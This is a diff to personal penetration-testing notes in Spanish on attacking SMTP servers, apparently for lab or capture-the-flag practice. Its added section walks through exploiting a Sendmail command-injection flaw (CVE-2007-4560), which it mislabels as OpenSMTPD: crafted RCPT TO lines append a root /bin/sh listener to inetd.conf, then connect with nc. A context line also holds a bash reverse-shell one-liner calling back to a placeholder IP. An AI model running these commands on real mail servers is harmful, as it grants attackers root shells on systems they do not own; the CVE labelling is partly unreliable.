@@ -20,7 +20,7 @@ Tags: #SMTP
 	❯ RCPT TO: Omar           # Define el destinatario de un mensaje
 
 	❯ AUTH LOGIN              # Para autenticarte
-		❯ YryRIwfui54        # Agregamos el usuario y el dominio 'administrator@test.com' en base64
+		❯ YryRIwfui54         # Agregamos el usuario y el dominio 'administrator@test.com' en base64
 		❯ Yonf6hU7Vop        # Colocamos la password en base64 
 
 	❯ QUIT                    # Para salir de la sesion 
@@ -70,4 +70,31 @@ Notas:
 ❯ nano index.html        # Archivo con la revershell 
 	#!/bin/bash 
 	bash -i >& /dev/tvp/IP/443 0>&1
+```
+
+## Explotar OpenSMTPD - Versión 8.13.4 (Debian Sarge)
+
+* [CVE-2007-4560](https://github.com/strikoder/sendmail-clamav-exploit-CVE-2007-4560)
+
+```bash 
+❯ python3 explit.py IP
+# Usar el exploit es ma manera mas fácil
+# Esto funciona si Sendmail es vulnerable a command injection y corre como root 
+
+# Forma manual 
+❯ nc IP 25    # Conectarse al puerto 
+	❯ helo test 
+	❯ MAIL FROM: <>
+	❯ RCPT TO: <nobody+"|echo '1002 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost>   
+	# Inyección del comando 
+	❯ RCPT TO: <nobody+"|/etc/init.d/inetd restart"@localhost>  
+	# Reiniciar inetd 
+	❯ DATA
+		❯ test
+		❯ .
+		❯ QUIT 
+
+# Conectarse de la siguiente manera:
+❯ nc IP 1002
+❯ bash -i       # Obtener una shell 
 ```
